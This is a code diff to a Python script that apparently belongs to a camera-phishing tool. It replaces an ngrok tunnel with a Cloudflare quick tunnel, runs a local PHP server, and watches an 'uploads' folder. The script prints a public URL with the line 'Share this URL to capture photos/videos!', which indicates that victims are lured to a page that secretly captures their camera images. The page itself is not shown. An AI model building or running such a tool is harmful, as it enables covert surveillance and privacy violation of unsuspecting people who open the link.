@@ -36,7 +36,6 @@ PHP_PORT = random.randint(8000,8999)
 PHP_FOLDER = "./"  
 FOLDER_TO_WATCH = "uploads"
 INDEX = "index.html"
-TOKEN_FILE = "token.txt"
 # -------------------------------------------------------------------
 
 def clear():
@@ -54,14 +53,8 @@ if not shutil.which("php"):
         subprocess.run(["sudo", "apt", "install","php"])
     print(f"\n{messages['error']}Php is NOT installed!\n\nInstall On Windows: https://www.php.net/downloads.php")
 
-if not shutil.which("ngrok"):
-    sys.exit(f"\n{messages['error']}ngrok is NOT installed!\n\nInstall On windows: winget install ngrok -s msstore\nOr Download Portable: https://ngrok.com/download/windows?tab=download\n\nInstall On Termux: \npkg update -y\npkg install git\ngit clone https://github.com/Yisus7u7/termux-ngrok\ncd termux-ngrok\nbash install.sh\n\nInstall On Linux: https://ngrok.com/download/linux\n\nAnd then add your token (ngrok config add-authtoken <token>)")
-
-def tokenngrok():
-    if os.path.isfile(TOKEN_FILE):
-        with open(TOKEN_FILE, "r") as f:
-            token = f.read().strip()
-        return token if token else None
+if not shutil.which("cloudflared"):
+    sys.exit(f"\n{messages['error']}'cloudflared' is NOT installed!\n\nInstall On Linux: \nwget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb\nsudo dpkg -i cloudflared-linux-amd64.deb\n\nInstall On Windows: \nwinget install cloudflare.cloudflared\n\nInstall On Termux: \npkg install cloudflared\n\nMore info: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/")
     
 user = os.popen("whoami").read().strip()
 os.environ["USER"] = user
@@ -96,16 +89,6 @@ else:
                 {colors['red']}Tg&Git: @c2-tlhah{colors['reset']}\n\n                                       
                  """
 
-print (b)
-token = tokenngrok()
-
-if not token:
-    user_token = input(f"{messages['true']}Enter Token Ngrok: {colors['reset']}")
-    with open(TOKEN_FILE, "w") as f:
-        f.write(user_token.strip())
-    subprocess.run(["ngrok", "config", "add-authtoken", user_token])
-
-clear()
 print (b)
 
 forindex = input(f"{messages['forindex']}Do you want to change the settings of the 'index.html' file? (y/n): {colors['reset']}").upper()
@@ -147,35 +130,33 @@ def php_server():
     time.sleep(2)
     return php_proc
 
-def ngrok(port):
-    print(f"{messages['true']}Starting ngrok on port {colors['yellow']}{port}{colors['reset']}...")
-    ngrok_proc = subprocess.Popen(
-        ["ngrok", "http", str(port)],
+def cloudflared_tunnel(port):
+    """Starts a cloudflared tunnel and extracts the public URL."""
+    print(f"{messages['true']}Starting Cloudflare tunnel on port {colors['yellow']}{port}{colors['reset']}...")
+    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
+    
+    tunnel_proc = subprocess.Popen(
+        cmd,
         stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE
+        stderr=subprocess.STDOUT,
+        text=True
     )
-    time.sleep(8)  
-    return ngrok_proc
-
-def ngrok_url():
-    try:
-        result = subprocess.run(
-            ['curl', '-s', '-N', 'http://127.0.0.1:4040/api/tunnels'],
-            capture_output=True,
-            text=True
-        )
-        output = result.stdout
-        matches = re.findall(r"https://[0-9a-z]*\.ngrok-free\.app", output)
-        if matches:
-            for url in matches:
-                print(f"\n{messages['true']}public URL:", url)
-            return matches
-        else:
-            print(f"\n{messages['error']}No ngrok URL found. Use a VPN if you are banned")
-            # exit() # Don't exit, allow local testing
-    except Exception as e:
-        print(f"\n{messages['error']}Error:", e)
-        return None
+    
+    # Read output to find the public URL
+    url_found = False
+    for line in iter(tunnel_proc.stdout.readline, ''):
+        match = re.search(r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com', line)
+        if match:
+            url = match.group(0)
+            print(f"\n{messages['true']}Public URL: {colors['yellow']}{url}{colors['reset']}")
+            print(f"{messages['true']}Share this URL to capture photos/videos!\n")
+            url_found = True
+            break
+    
+    if not url_found:
+        print(f"{messages['error']}Could not extract Cloudflare URL. Check if cloudflared is properly installed.")
+    
+    return tunnel_proc
 
 class WatcherHandler(FileSystemEventHandler):
     def on_created(self, event):
@@ -187,14 +168,13 @@ class WatcherHandler(FileSystemEventHandler):
 if __name__ == "__main__":
 
     php_proc = php_server()
-    ngrok_proc = ngrok(PHP_PORT)
-    ngrok_url()
+    tunnel_proc = cloudflared_tunnel(PHP_PORT)
 
     event_handler = WatcherHandler()
     observer = Observer()
     observer.schedule(event_handler, FOLDER_TO_WATCH, recursive=False)
     observer.start()
-    print(f"\n{messages['true']}Photo capture Started => {colors['yellow']}{FOLDER_TO_WATCH}\n")
+    print(f"{messages['true']}Photo capture Started => {colors['yellow']}{FOLDER_TO_WATCH}\n")
 
     try:
         while True:
@@ -202,7 +182,7 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         print(f"\n{colors['red']}Stopping servers and observer...")
         php_proc.terminate()
-        ngrok_proc.terminate()
+        tunnel_proc.terminate()
         observer.stop()
 
         observer.join()
